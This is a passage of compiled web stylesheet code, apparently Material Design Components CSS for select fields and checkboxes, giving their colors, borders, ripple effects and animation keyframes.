    .VfPpkd-O1htCb-OWXEXe-INsAgc .VfPpkd-TkwUic::before {
      display: none
    }

    @keyframes mdc-floating-label-shake-float-above-select-outlined-leading-icon-56px {
      0% {
        transform: translateX(calc(0 - 32px)) translateY(-34.75px) scale(0.75)
      }

      33% {
        animation-timing-function: cubic-bezier(0.5, 0, 0.701732, 0.495819);
        transform: translateX(calc(4% - 32px)) translateY(-34.75px) scale(0.75)
      }

      66% {
        animation-timing-function: cubic-bezier(0.302435, 0.381352, 0.55, 0.956352);
        transform: translateX(calc(-4% - 32px)) translateY(-34.75px) scale(0.75)
      }

      to {
        transform: translateX(calc(0 - 32px)) translateY(-34.75px) scale(0.75)
      }
    }

    @keyframes mdc-floating-label-shake-float-above-select-outlined-leading-icon-56px-rtl {
      0% {
        transform: translateX(calc(0 - -32px)) translateY(-34.75px) scale(0.75)
      }

      33% {
        animation-timing-function: cubic-bezier(0.5, 0, 0.701732, 0.495819);
        transform: translateX(calc(4% - -32px)) translateY(-34.75px) scale(0.75)
      }

      66% {
        animation-timing-function: cubic-bezier(0.302435, 0.381352, 0.55, 0.956352);
        transform: translateX(calc(-4% - -32px)) translateY(-34.75px) scale(0.75)
      }

      to {
        transform: translateX(calc(0 - -32px)) translateY(-34.75px) scale(0.75)
      }
    }

    .VfPpkd-TkwUic {
      --mdc-ripple-fg-size: 0;
      --mdc-ripple-left: 0;
      --mdc-ripple-top: 0;
      --mdc-ripple-fg-scale: 1;
      --mdc-ripple-fg-translate-end: 0;
      --mdc-ripple-fg-translate-start: 0;
      will-change: transform, opacity
    }

    .VfPpkd-O1htCb:not(.VfPpkd-O1htCb-OWXEXe-OWB6Me) .VfPpkd-uusGie-fmcmS {
      color: rgba(0, 0, 0, .87)
    }

    .VfPpkd-O1htCb:not(.VfPpkd-O1htCb-OWXEXe-OWB6Me) .VfPpkd-t08AT-Bz112c {
      fill: rgba(0, 0, 0, .54)
    }

    .VfPpkd-O1htCb .VfPpkd-TkwUic {
      padding-left: 16px;
      padding-right: 0
    }

    .VfPpkd-O1htCb .VfPpkd-t08AT-Bz112c {
      width: 24px;
      height: 24px
    }

    .VfPpkd-t08AT-Bz112c {
      margin-left: 12px;
      margin-right: 12px
    }

    .VfPpkd-TkwUic {
      width: 200px
    }

    .ReCbLb:not(.VfPpkd-O1htCb-OWXEXe-OWB6Me) .VfPpkd-NSFCdd-Brv4Fb,
    .ReCbLb:not(.VfPpkd-O1htCb-OWXEXe-OWB6Me) .VfPpkd-NSFCdd-Ra9xwd,
    .ReCbLb:not(.VfPpkd-O1htCb-OWXEXe-OWB6Me) .VfPpkd-NSFCdd-MpmGFe {
      border-color: #80868b
    }

    .ReCbLb:not(.VfPpkd-O1htCb-OWXEXe-OWB6Me):not(.VfPpkd-O1htCb-OWXEXe-XpnDCe) .VfPpkd-TkwUic:hover .VfPpkd-NSFCdd-i5vt6e .VfPpkd-NSFCdd-Brv4Fb,
    .ReCbLb:not(.VfPpkd-O1htCb-OWXEXe-OWB6Me):not(.VfPpkd-O1htCb-OWXEXe-XpnDCe) .VfPpkd-TkwUic:hover .VfPpkd-NSFCdd-i5vt6e .VfPpkd-NSFCdd-Ra9xwd,
    .ReCbLb:not(.VfPpkd-O1htCb-OWXEXe-OWB6Me):not(.VfPpkd-O1htCb-OWXEXe-XpnDCe) .VfPpkd-TkwUic:hover .VfPpkd-NSFCdd-i5vt6e .VfPpkd-NSFCdd-MpmGFe {
      border-color: #202124
    }

    .ReCbLb:not(.VfPpkd-O1htCb-OWXEXe-OWB6Me) .VfPpkd-uusGie-fmcmS {
      color: #3c4043
    }

    .ReCbLb:not(.VfPpkd-O1htCb-OWXEXe-OWB6Me) .VfPpkd-t08AT-Bz112c {
      fill: #5f6368
    }

    .ReCbLb:not(.VfPpkd-O1htCb-OWXEXe-OWB6Me):not(.VfPpkd-O1htCb-OWXEXe-XpnDCe):hover .VfPpkd-t08AT-Bz112c {
      fill: #202124
    }

    @keyframes mdc-floating-label-shake-float-above-standard {
      0% {
        transform: translateX(calc(0 - 0%)) translateY(-106%) scale(0.75)
      }

      33% {
        animation-timing-function: cubic-bezier(0.5, 0, 0.701732, 0.495819);
        transform: translateX(calc(4% - 0%)) translateY(-106%) scale(0.75)
      }

      66% {
        animation-timing-function: cubic-bezier(0.302435, 0.381352, 0.55, 0.956352);
        transform: translateX(calc(-4% - 0%)) translateY(-106%) scale(0.75)
      }

      to {
        transform: translateX(calc(0 - 0%)) translateY(-106%) scale(0.75)
      }
    }

    .VfPpkd-NSFCdd-i5vt6e {
      display: -webkit-box;
      display: -moz-box;
      display: -webkit-flex;
      display: -ms-flexbox;
      display: flex;
      position: absolute;
      top: 0;
      right: 0;
      left: 0;
      box-sizing: border-box;
      width: 100%;
      max-width: 100%;
      height: 100%;
      text-align: left;
      pointer-events: none
    }

    .VfPpkd-NSFCdd-Brv4Fb,
    .VfPpkd-NSFCdd-MpmGFe {
      box-sizing: border-box;
      height: 100%;
      border-top: 1px solid;
      border-bottom: 1px solid;
      pointer-events: none
    }

    .VfPpkd-NSFCdd-Brv4Fb {
      border-left: 1px solid;
      border-right: none;
      width: 12px
    }

    .VfPpkd-NSFCdd-MpmGFe {
      border-left: none;
      border-right: 1px solid;
      flex-grow: 1
    }

    .VfPpkd-MPu53c {
      padding: -moz-calc((40px - 18px)/2);
      padding: -moz-calc((var(--mdc-checkbox-ripple-size, 40px) - 18px)/2);
      padding: calc((var(--mdc-checkbox-ripple-size, 40px) - 18px)/2);
      margin: -moz-calc((40px - 40px)/2);
      margin: -moz-calc((var(--mdc-checkbox-touch-target-size, 40px) - 40px)/2)
    }

    .VfPpkd-MPu53c .VfPpkd-OYHm6b::before,
    .VfPpkd-MPu53c .VfPpkd-OYHm6b::after {
      background-color: #000;
      background-color: var(--mdc-ripple-color, #000)
    }

    .VfPpkd-MPu53c:hover .VfPpkd-OYHm6b::before,
    .VfPpkd-MPu53c.VfPpkd-ksKsZd-XxIAqe-OWXEXe-ZmdkE .VfPpkd-OYHm6b::before {
      opacity: .04;
      opacity: var(--mdc-ripple-hover-opacity, 0.04)
    }

    .VfPpkd-MPu53c.VfPpkd-ksKsZd-mWPk3d-OWXEXe-AHe6Kc-XpnDCe .VfPpkd-OYHm6b::before,
    .VfPpkd-MPu53c:not(.VfPpkd-ksKsZd-mWPk3d):focus .VfPpkd-OYHm6b::before {
      transition-duration: 75ms;
      opacity: .12;
      opacity: var(--mdc-ripple-focus-opacity, 0.12)
    }

    .VfPpkd-MPu53c:not(.VfPpkd-ksKsZd-mWPk3d) .VfPpkd-OYHm6b::after {
      transition: opacity 150ms linear
    }

    .VfPpkd-MPu53c:not(.VfPpkd-ksKsZd-mWPk3d):active .VfPpkd-OYHm6b::after {
      transition-duration: 75ms;
      opacity: .12;
      opacity: var(--mdc-ripple-press-opacity, 0.12)
    }

    .VfPpkd-MPu53c .VfPpkd-YQoJzd {
      top: -moz-calc((40px - 18px)/2);
      top: -moz-calc((var(--mdc-checkbox-ripple-size, 40px) - 18px)/2);
      top: calc((var(--mdc-checkbox-ripple-size, 40px) - 18px)/2);
      left: -moz-calc((40px - 18px)/2);
      left: -moz-calc((var(--mdc-checkbox-ripple-size, 40px) - 18px)/2);
      left: calc((var(--mdc-checkbox-ripple-size, 40px) - 18px)/2)
    }

    .VfPpkd-MPu53c .VfPpkd-muHVFf-bMcfAe {
      top: -moz-calc((40px - 40px)/2);
      top: -moz-calc((40px - var(--mdc-checkbox-touch-target-size, 40px))/2);
      right: -moz-calc((40px - 40px)/2);
      right: -moz-calc((40px - var(--mdc-checkbox-touch-target-size, 40px))/2);
      left: -moz-calc((40px - 40px)/2);
      left: -moz-calc((40px - var(--mdc-checkbox-touch-target-size, 40px))/2)
    }

    .VfPpkd-MPu53c .VfPpkd-muHVFf-bMcfAe:enabled:not(:checked):not(:indeterminate):not([data-indeterminate=true])~.VfPpkd-YQoJzd {
      border-color: rgba(0, 0, 0, .54);
      border-color: var(--mdc-checkbox-unchecked-color, rgba(0, 0, 0, .54));
      background-color: transparent
    }

    .VfPpkd-MPu53c .VfPpkd-muHVFf-bMcfAe:enabled:checked~.VfPpkd-YQoJzd,
    .VfPpkd-MPu53c .VfPpkd-muHVFf-bMcfAe:enabled:indeterminate~.VfPpkd-YQoJzd,
    .VfPpkd-MPu53c .VfPpkd-muHVFf-bMcfAe[data-indeterminate=true]:enabled~.VfPpkd-YQoJzd {
      border-color: #018786;
      border-color: var(--mdc-checkbox-checked-color, var(--mdc-theme-secondary, #018786));
      background-color: #018786;
      background-color: var(--mdc-checkbox-checked-color, var(--mdc-theme-secondary, #018786))
    }

    @keyframes mdc-checkbox-fade-in-background-8A000000FF01878600000000FF018786 {
      0% {
        border-color: rgba(0, 0, 0, .54);
        border-color: var(--mdc-checkbox-unchecked-color, rgba(0, 0, 0, .54));
        background-color: transparent
      }

      50% {
        border-color: #018786;
        border-color: var(--mdc-checkbox-checked-color, var(--mdc-theme-secondary, #018786));
        background-color: #018786;
        background-color: var(--mdc-checkbox-checked-color, var(--mdc-theme-secondary, #018786))
      }
    }

    @keyframes mdc-checkbox-fade-out-background-8A000000FF01878600000000FF018786 {

      0%,
      80% {
        border-color: #018786;
        border-color: var(--mdc-checkbox-checked-color, var(--mdc-theme-secondary, #018786));
        background-color: #018786;
        background-color: var(--mdc-checkbox-checked-color, var(--mdc-theme-secondary, #018786))
      }

      to {
        border-color: rgba(0, 0, 0, .54);
        border-color: var(--mdc-checkbox-unchecked-color, rgba(0, 0, 0, .54));
        background-color: transparent
      }
    }

    .VfPpkd-MPu53c .VfPpkd-muHVFf-bMcfAe:enabled~.VfPpkd-YQoJzd .VfPpkd-HUofsb {
      color: #fff;
      color: var(--mdc-checkbox-ink-color, #fff)
    }

    .VfPpkd-MPu53c .VfPpkd-muHVFf-bMcfAe:enabled~.VfPpkd-YQoJzd .VfPpkd-SJnn3d {
      border-color: #fff;
      border-color: var(--mdc-checkbox-ink-color, #fff)
    }

    .VfPpkd-MPu53c .VfPpkd-muHVFf-bMcfAe:disabled~.VfPpkd-YQoJzd .VfPpkd-HUofsb {
      color: #fff;
      color: var(--mdc-checkbox-ink-color, #fff)
    }

    .VfPpkd-MPu53c .VfPpkd-muHVFf-bMcfAe:disabled~.VfPpkd-YQoJzd .VfPpkd-SJnn3d {
      border-color: #fff;
      border-color: var(--mdc-checkbox-ink-color, #fff)
    }

    @keyframes mdc-checkbox-unchecked-checked-checkmark-path {

      0%,
      50% {
        stroke-dashoffset: 29.7833385
      }

      50% {
        animation-timing-function: cubic-bezier(0, 0, 0.2, 1)
      }

      to {
        stroke-dashoffset: 0
      }
    }

    @keyframes mdc-checkbox-unchecked-indeterminate-mixedmark {

      0%,
      68.2% {
        transform: scaleX(0)
      }

      68.2% {
        animation-timing-function: cubic-bezier(0, 0, 0, 1)
      }

      to {
        transform: scaleX(1)
      }
    }

    @keyframes mdc-checkbox-checked-unchecked-checkmark-path {
      0% {
        animation-timing-function: cubic-bezier(0.4, 0, 1, 1);
        opacity: 1;
        stroke-dashoffset: 0
      }

      to {
        opacity: 0;
        stroke-dashoffset: -29.7833385
      }
    }

    @keyframes mdc-checkbox-checked-indeterminate-checkmark {
      0% {
        animation-timing-function: cubic-bezier(0, 0, 0.2, 1);
        transform: rotate(0deg);
        opacity: 1
      }

      to {
        transform: rotate(45deg);
        opacity: 0
      }
    }

    @keyframes mdc-checkbox-indeterminate-checked-checkmark {
      0% {
        animation-timing-function: cubic-bezier(0.14, 0, 0, 1);
        transform: rotate(45deg);
        opacity: 0
      }

      to {
        transform: rotate(360deg);
        opacity: 1
      }
    }

    @keyframes mdc-checkbox-checked-indeterminate-mixedmark {
      0% {
        animation-timing-function: mdc-animation-deceleration-curve-timing-function;
        transform: rotate(-45deg);
        opacity: 0
      }

      to {
        transform: rotate(0deg);
        opacity: 1
      }
    }

    @keyframes mdc-checkbox-indeterminate-checked-mixedmark {
      0% {
        animation-timing-function: cubic-bezier(0.14, 0, 0, 1);
        transform: rotate(0deg);
        opacity: 1
      }

      to {
        transform: rotate(315deg);
        opacity: 0
      }
    }

    @keyframes mdc-checkbox-indeterminate-unchecked-mixedmark {
      0% {
        animation-timing-function: linear;
        transform: scaleX(1);
        opacity: 1
      }

      32.8%,
      to {
        transform: scaleX(0);
        opacity: 0
      }
    }

    .VfPpkd-MPu53c {
      position: relative;
      -moz-box-flex: 0 0 18px;
      flex: 0 0 18px;
      width: 18px;
      height: 18px;
      line-height: 0;
      white-space: nowrap;
      cursor: pointer;
      vertical-align: bottom
    }

    .VfPpkd-MPu53c.VfPpkd-ksKsZd-mWPk3d-OWXEXe-AHe6Kc-XpnDCe .VfPpkd-sMek6-LhBDec,
    .VfPpkd-MPu53c:not(.VfPpkd-ksKsZd-mWPk3d):focus .VfPpkd-sMek6-LhBDec {
      pointer-events: none;
      border: 2px solid transparent;
      -moz-border-radius: 6px;
      border-radius: 6px;
      box-sizing: content-box;
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      height: 100%;
      width: 100%
    }

    @media screen and (forced-colors:active) {

      .VfPpkd-MPu53c.VfPpkd-ksKsZd-mWPk3d-OWXEXe-AHe6Kc-XpnDCe .VfPpkd-sMek6-LhBDec,
      .VfPpkd-MPu53c:not(.VfPpkd-ksKsZd-mWPk3d):focus .VfPpkd-sMek6-LhBDec {
        border-color: CanvasText
      }
    }

    .VfPpkd-MPu53c.VfPpkd-ksKsZd-mWPk3d-OWXEXe-AHe6Kc-XpnDCe .VfPpkd-sMek6-LhBDec::after,
    .VfPpkd-MPu53c:not(.VfPpkd-ksKsZd-mWPk3d):focus .VfPpkd-sMek6-LhBDec::after {
      content: "";
      border: 2px solid transparent;
      -moz-border-radius: 8px;
      border-radius: 8px;
      display: block;
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      height: -moz-calc(100% + 4px);
      height: calc(100% + 4px);
      width: -moz-calc(100% + 4px);
      width: calc(100% + 4px)
    }

    @media screen and (forced-colors:active) {

      .VfPpkd-MPu53c.VfPpkd-ksKsZd-mWPk3d-OWXEXe-AHe6Kc-XpnDCe .VfPpkd-sMek6-LhBDec::after,
      .VfPpkd-MPu53c:not(.VfPpkd-ksKsZd-mWPk3d):focus .VfPpkd-sMek6-LhBDec::after {
        border-color: CanvasText
      }
    }

    @media all and (-ms-high-contrast:none) {
      .VfPpkd-MPu53c .VfPpkd-sMek6-LhBDec {
        display: none
      }
    }

    @media screen and (forced-colors:active),
    (-ms-high-contrast:active) {
      .VfPpkd-SJnn3d {
        margin: 0 1px
      }
    }

    .VfPpkd-YQoJzd {
      display: -webkit-inline-box;
      display: -webkit-inline-flex;
      display: -ms-inline-flexbox;
      display: inline-flex;
      position: absolute;
      align-items: center;
      justify-content: center;
      width: 18px;
      height: 18px;
      border: 2px solid currentColor;
      -moz-border-radius: 2px;
      border-radius: 2px;
      background-color: transparent;
      pointer-events: none;
      will-change: background-color, border-color
    }

    .VfPpkd-HUofsb {
      position: absolute;
      top: 0;
      right: 0;
      bottom: 0;
      left: 0;
      width: 100%
    }

    .VfPpkd-MPu53c-OWXEXe-mWPk3d .VfPpkd-HUofsb {
      opacity: 1
    }

    .VfPpkd-HUofsb-Jt5cK {
      stroke: currentColor;
      stroke-width: 3.12px;
      stroke-dashoffset: 29.7833385;
      stroke-dasharray: 29.7833385
    }

    .VfPpkd-SJnn3d {
      width: 100%;
      height: 0;
      transform: scaleX(0) rotate(0deg);
      border-width: 1px;
      border-style: solid;
      opacity: 0
    }

    .VfPpkd-muHVFf-bMcfAe:checked~.VfPpkd-YQoJzd,
    .VfPpkd-muHVFf-bMcfAe:indeterminate~.VfPpkd-YQoJzd,
    .VfPpkd-muHVFf-bMcfAe[data-indeterminate=true]~.VfPpkd-YQoJzd {
      transition: border-color 90ms 0ms cubic-bezier(0, 0, 0.2, 1), background-color 90ms 0ms cubic-bezier(0, 0, 0.2, 1)
    }

    .VfPpkd-muHVFf-bMcfAe:checked~.VfPpkd-YQoJzd .VfPpkd-HUofsb-Jt5cK,
    .VfPpkd-muHVFf-bMcfAe:indeterminate~.VfPpkd-YQoJzd .VfPpkd-HUofsb-Jt5cK,
    .VfPpkd-muHVFf-bMcfAe[data-indeterminate=true]~.VfPpkd-YQoJzd .VfPpkd-HUofsb-Jt5cK {
      stroke-dashoffset: 0
    }

    .VfPpkd-muHVFf-bMcfAe {
      position: absolute;
      margin: 0;
      padding: 0;
      opacity: 0;
      cursor: inherit
    }

    .VfPpkd-muHVFf-bMcfAe:disabled {
      cursor: default;
      pointer-events: none
    }

    .VfPpkd-MPu53c-OWXEXe-dgl2Hf {
      margin: -moz-calc((48px - 40px)/2);
      margin: -moz-calc((var(--mdc-checkbox-state-layer-size, 48px) - var(--mdc-checkbox-state-layer-size, 40px))/2);
      margin: calc((var(--mdc-checkbox-state-layer-size, 48px) - var(--mdc-checkbox-state-layer-size, 40px))/2)
    }

    .VfPpkd-MPu53c-OWXEXe-dgl2Hf .VfPpkd-muHVFf-bMcfAe {
      top: -moz-calc((40px - 48px)/2);
      top: -moz-calc((var(--mdc-checkbox-state-layer-size, 40px) - var(--mdc-checkbox-state-layer-size, 48px))/2);
      top: calc((var(--mdc-checkbox-state-layer-size, 40px) - var(--mdc-checkbox-state-layer-size, 48px))/2);
      right: -moz-calc((40px - 48px)/2);
      right: -moz-calc((var(--mdc-checkbox-state-layer-size, 40px) - var(--mdc-checkbox-state-layer-size, 48px))/2);
      right: calc((var(--mdc-checkbox-state-layer-size, 40px) - var(--mdc-checkbox-state-layer-size, 48px))/2);
      left: -moz-calc((40px - 48px)/2);
      left: -moz-calc((var(--mdc-checkbox-state-layer-size, 40px) - var(--mdc-checkbox-state-layer-size, 48px))/2);
      left: calc((var(--mdc-checkbox-state-layer-size, 40px) - var(--mdc-checkbox-state-layer-size, 48px))/2);
      width: var(--mdc-checkbox-state-layer-size, 48px);
      height: var(--mdc-checkbox-state-layer-size, 48px)
    }

    .VfPpkd-muHVFf-bMcfAe:checked~.VfPpkd-YQoJzd .VfPpkd-HUofsb {
      transition: opacity 180ms 0ms cubic-bezier(0, 0, 0.2, 1), transform 180ms 0ms cubic-bezier(0, 0, 0.2, 1);
      opacity: 1
    }

    .VfPpkd-muHVFf-bMcfAe:checked~.VfPpkd-YQoJzd .VfPpkd-SJnn3d {
      transform: scaleX(1) rotate(-45deg)
    }

    .VfPpkd-muHVFf-bMcfAe:indeterminate~.VfPpkd-YQoJzd .VfPpkd-HUofsb,
    .VfPpkd-muHVFf-bMcfAe[data-indeterminate=true]~.VfPpkd-YQoJzd .VfPpkd-HUofsb {
      transform: rotate(45deg);
      opacity: 0;
      transition: opacity 90ms 0ms cubic-bezier(0.4, 0, 0.6, 1), transform 90ms 0ms cubic-bezier(0.4, 0, 0.6, 1)
    }

    .VfPpkd-muHVFf-bMcfAe:indeterminate~.VfPpkd-YQoJzd .VfPpkd-SJnn3d,
    .VfPpkd-muHVFf-bMcfAe[data-indeterminate=true]~.VfPpkd-YQoJzd .VfPpkd-SJnn3d {
      transform: scaleX(1) rotate(0deg);
      opacity: 1
    }

    .VfPpkd-MPu53c.VfPpkd-MPu53c-OWXEXe-mWPk3d .VfPpkd-YQoJzd,
    .VfPpkd-MPu53c.VfPpkd-MPu53c-OWXEXe-mWPk3d .VfPpkd-HUofsb,
    .VfPpkd-MPu53c.VfPpkd-MPu53c-OWXEXe-mWPk3d .VfPpkd-HUofsb-Jt5cK,
    .VfPpkd-MPu53c.VfPpkd-MPu53c-OWXEXe-mWPk3d .VfPpkd-SJnn3d {
      transition: none
    }

    .VfPpkd-MPu53c {
      --mdc-ripple-fg-size: 0;
      --mdc-ripple-left: 0;
      --mdc-ripple-top: 0;
      --mdc-ripple-fg-scale: 1;
      --mdc-ripple-fg-translate-end: 0;
      --mdc-ripple-fg-translate-start: 0
    }

    .VfPpkd-MPu53c .VfPpkd-OYHm6b::before,
    .VfPpkd-MPu53c .VfPpkd-OYHm6b::after {
      position: absolute;
      -moz-border-radius: 50%;
      border-radius: 50%;
      opacity: 0;
      pointer-events: none;
      content: ""
    }

    .VfPpkd-MPu53c .VfPpkd-OYHm6b::before {
      transition: opacity 15ms linear, background-color 15ms linear
    }

    .VfPpkd-MPu53c .VfPpkd-OYHm6b::before,
    .VfPpkd-MPu53c .VfPpkd-OYHm6b::after {
      top: -moz-calc(50% - 50%);
      top: calc(50% - 50%);
      left: -moz-calc(50% - 50%);
      left: calc(50% - 50%);
      width: 100%;
      height: 100%
    }

    .VfPpkd-MPu53c {
      z-index: 0
    }

    .VfPpkd-MPu53c .VfPpkd-OYHm6b::before,
    .VfPpkd-MPu53c .VfPpkd-OYHm6b::after {
      z-index: -1;
      z-index: var(--mdc-ripple-z-index, -1)
    }

    .VfPpkd-OYHm6b {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      pointer-events: none
    }

    @media screen and (forced-colors:active),
    (-ms-high-contrast:active) {
      .VfPpkd-MPu53c .VfPpkd-muHVFf-bMcfAe:enabled~.VfPpkd-YQoJzd .VfPpkd-HUofsb {
        color: ButtonText;
        color: var(--mdc-checkbox-selected-checkmark-color, ButtonText)
      }

      .VfPpkd-MPu53c .VfPpkd-muHVFf-bMcfAe:enabled~.VfPpkd-YQoJzd .VfPpkd-SJnn3d {
        border-color: ButtonText;
        border-color: var(--mdc-checkbox-selected-checkmark-color, ButtonText)
      }

      .VfPpkd-MPu53c .VfPpkd-muHVFf-bMcfAe:disabled~.VfPpkd-YQoJzd .VfPpkd-HUofsb {
        color: ButtonFace;
        color: var(--mdc-checkbox-disabled-selected-checkmark-color, ButtonFace)
      }

      .VfPpkd-MPu53c .VfPpkd-muHVFf-bMcfAe:disabled~.VfPpkd-YQoJzd .VfPpkd-SJnn3d {
        border-color: ButtonFace;
        border-color: var(--mdc-checkbox-disabled-selected-checkmark-color, ButtonFace)
      }
    }

    .Ne8lhe .VfPpkd-muHVFf-bMcfAe:enabled~.VfPpkd-YQoJzd .VfPpkd-HUofsb {
      color: #fff;
      color: var(--mdc-checkbox-selected-checkmark-color, #fff)
    }

    .Ne8lhe .VfPpkd-muHVFf-bMcfAe:enabled~.VfPpkd-YQoJzd .VfPpkd-SJnn3d {
      border-color: #fff;
      border-color: var(--mdc-checkbox-selected-checkmark-color, #fff)
    }

    .Ne8lhe .VfPpkd-muHVFf-bMcfAe:disabled~.VfPpkd-YQoJzd .VfPpkd-HUofsb {
      color: #fff;
      color: var(--mdc-checkbox-disabled-selected-checkmark-color, #fff)
    }

    .Ne8lhe .VfPpkd-muHVFf-bMcfAe:disabled~.VfPpkd-YQoJzd .VfPpkd-SJnn3d {
      border-color: #fff;
      border-color: var(--mdc-checkbox-disabled-selected-checkmark-color, #fff)
    }

    .Ne8lhe .VfPpkd-muHVFf-bMcfAe:enabled:not(:checked):not(:indeterminate):not([data-indeterminate=true])~.VfPpkd-YQoJzd {
      border-color: #5f6368;
      border-color: var(--mdc-checkbox-unselected-icon-color, #5f6368);
      background-color: transparent
    }

    .Ne8lhe .VfPpkd-muHVFf-bMcfAe:enabled:checked~.VfPpkd-YQoJzd,
    .Ne8lhe .VfPpkd-muHVFf-bMcfAe:enabled:indeterminate~.VfPpkd-YQoJzd,
    .Ne8lhe .VfPpkd-muHVFf-bMcfAe[data-indeterminate=true]:enabled~.VfPpkd-YQoJzd {
      border-color: #1a73e8;
      border-color: var(--mdc-checkbox-selected-icon-color, #1a73e8);
      background-color: #1a73e8;
      background-color: var(--mdc-checkbox-selected-icon-color, #1a73e8)
    }

    @keyframes mdc-checkbox-fade-in-background-FF5F6368FF1A73E800000000FF1A73E8 {
      0% {
        border-color: #5f6368;
        border-color: var(--mdc-checkbox-unselected-icon-color, #5f6368);
        background-color: transparent
      }

      50% {
        border-color: #1a73e8;
        border-color: var(--mdc-checkbox-selected-icon-color, #1a73e8);
        background-color: #1a73e8;
        background-color: var(--mdc-checkbox-selected-icon-color, #1a73e8)
      }
    }

    @keyframes mdc-checkbox-fade-out-background-FF5F6368FF1A73E800000000FF1A73E8 {

      0%,
      80% {
        border-color: #1a73e8;
        border-color: var(--mdc-checkbox-selected-icon-color, #1a73e8);
        background-color: #1a73e8;
        background-color: var(--mdc-checkbox-selected-icon-color, #1a73e8)
      }

      to {
        border-color: #5f6368;
        border-color: var(--mdc-checkbox-unselected-icon-color, #5f6368);
        background-color: transparent
      }
    }

    .Ne8lhe:hover .VfPpkd-muHVFf-bMcfAe:enabled:not(:checked):not(:indeterminate):not([data-indeterminate=true])~.VfPpkd-YQoJzd {
      border-color: #202124;
      border-color: var(--mdc-checkbox-unselected-hover-icon-color, #202124);
      background-color: transparent
    }

    .Ne8lhe:hover .VfPpkd-muHVFf-bMcfAe:enabled:checked~.VfPpkd-YQoJzd,
    .Ne8lhe:hover .VfPpkd-muHVFf-bMcfAe:enabled:indeterminate~.VfPpkd-YQoJzd,
    .Ne8lhe:hover .VfPpkd-muHVFf-bMcfAe[data-indeterminate=true]:enabled~.VfPpkd-YQoJzd {
      border-color: #174ea6;
      border-color: var(--mdc-checkbox-selected-hover-icon-color, #174ea6);
      background-color: #174ea6;
      background-color: var(--mdc-checkbox-selected-hover-icon-color, #174ea6)
    }

    @keyframes mdc-checkbox-fade-in-background-FF202124FF174EA600000000FF174EA6 {
      0% {
        border-color: #202124;
        border-color: var(--mdc-checkbox-unselected-hover-icon-color, #202124);
        background-color: transparent
      }

      50% {
        border-color: #174ea6;
        border-color: var(--mdc-checkbox-selected-hover-icon-color, #174ea6);
        background-color: #174ea6;
        background-color: var(--mdc-checkbox-selected-hover-icon-color, #174ea6)
      }
    }

    @keyframes mdc-checkbox-fade-out-background-FF202124FF174EA600000000FF174EA6 {

      0%,
      80% {
        border-color: #174ea6;
        border-color: var(--mdc-checkbox-selected-hover-icon-color, #174ea6);
        background-color: #174ea6;
        background-color: var(--mdc-checkbox-selected-hover-icon-color, #174ea6)
      }

      to {
        border-color: #202124;
        border-color: var(--mdc-checkbox-unselected-hover-icon-color, #202124);
        background-color: transparent
      }
    }

    .Ne8lhe.VfPpkd-ksKsZd-mWPk3d-OWXEXe-AHe6Kc-XpnDCe .VfPpkd-muHVFf-bMcfAe:enabled:not(:checked):not(:indeterminate):not([data-indeterminate=true])~.VfPpkd-YQoJzd,
    .Ne8lhe:not(.VfPpkd-ksKsZd-mWPk3d):focus .VfPpkd-muHVFf-bMcfAe:enabled:not(:checked):not(:indeterminate):not([data-indeterminate=true])~.VfPpkd-YQoJzd {
      border-color: #202124;
      border-color: var(--mdc-checkbox-unselected-focus-icon-color, #202124);
      background-color: transparent
    }

    .Ne8lhe.VfPpkd-ksKsZd-mWPk3d-OWXEXe-AHe6Kc-XpnDCe .VfPpkd-muHVFf-bMcfAe:enabled:checked~.VfPpkd-YQoJzd,
    .Ne8lhe.VfPpkd-ksKsZd-mWPk3d-OWXEXe-AHe6Kc-XpnDCe .VfPpkd-muHVFf-bMcfAe:enabled:indeterminate~.VfPpkd-YQoJzd,
    .Ne8lhe.VfPpkd-ksKsZd-mWPk3d-OWXEXe-AHe6Kc-XpnDCe .VfPpkd-muHVFf-bMcfAe[data-indeterminate=true]:enabled~.VfPpkd-YQoJzd,
    .Ne8lhe:not(.VfPpkd-ksKsZd-mWPk3d):focus .VfPpkd-muHVFf-bMcfAe:enabled:checked~.VfPpkd-YQoJzd,
    .Ne8lhe:not(.VfPpkd-ksKsZd-mWPk3d):focus .VfPpkd-muHVFf-bMcfAe:enabled:indeterminate~.VfPpkd-YQoJzd,
    .Ne8lhe:not(.VfPpkd-ksKsZd-mWPk3d):focus .VfPpkd-muHVFf-bMcfAe[data-indeterminate=true]:enabled~.VfPpkd-YQoJzd {
      border-color: #174ea6;
      border-color: var(--mdc-checkbox-selected-focus-icon-color, #174ea6);
      background-color: #174ea6;
      background-color: var(--mdc-checkbox-selected-focus-icon-color, #174ea6)
    }

    @keyframes mdc-checkbox-fade-in-background-FF202124FF174EA600000000FF174EA6 {
      0% {
        border-color: #202124;
        border-color: var(--mdc-checkbox-unselected-focus-icon-color, #202124);
        background-color: transparent
      }

      50% {
        border-color: #174ea6;
        border-color: var(--mdc-checkbox-selected-focus-icon-color, #174ea6);
        background-color: #174ea6;
        background-color: var(--mdc-checkbox-selected-focus-icon-color, #174ea6)
      }
    }

    @keyframes mdc-checkbox-fade-out-background-FF202124FF174EA600000000FF174EA6 {

      0%,
      80% {
        border-color: #174ea6;
        border-color: var(--mdc-checkbox-selected-focus-icon-color, #174ea6);
        background-color: #174ea6;
        background-color: var(--mdc-checkbox-selected-focus-icon-color, #174ea6)
      }

      to {
        border-color: #202124;
        border-color: var(--mdc-checkbox-unselected-focus-icon-color, #202124);
        background-color: transparent
      }
    }

    .Ne8lhe:not(:disabled):active .VfPpkd-muHVFf-bMcfAe:enabled:not(:checked):not(:indeterminate):not([data-indeterminate=true])~.VfPpkd-YQoJzd {
      border-color: #202124;
      border-color: var(--mdc-checkbox-unselected-pressed-icon-color, #202124);
      background-color: transparent
    }

    .Ne8lhe:not(:disabled):active .VfPpkd-muHVFf-bMcfAe:enabled:checked~.VfPpkd-YQoJzd,
    .Ne8lhe:not(:disabled):active .VfPpkd-muHVFf-bMcfAe:enabled:indeterminate~.VfPpkd-YQoJzd,
    .Ne8lhe:not(:disabled):active .VfPpkd-muHVFf-bMcfAe[data-indeterminate=true]:enabled~.VfPpkd-YQoJzd {
      border-color: #174ea6;
      border-color: var(--mdc-checkbox-selected-pressed-icon-color, #174ea6);
      background-color: #174ea6;
      background-color: var(--mdc-checkbox-selected-pressed-icon-color, #174ea6)
    }

    @keyframes mdc-checkbox-fade-in-background-FF202124FF174EA600000000FF174EA6 {
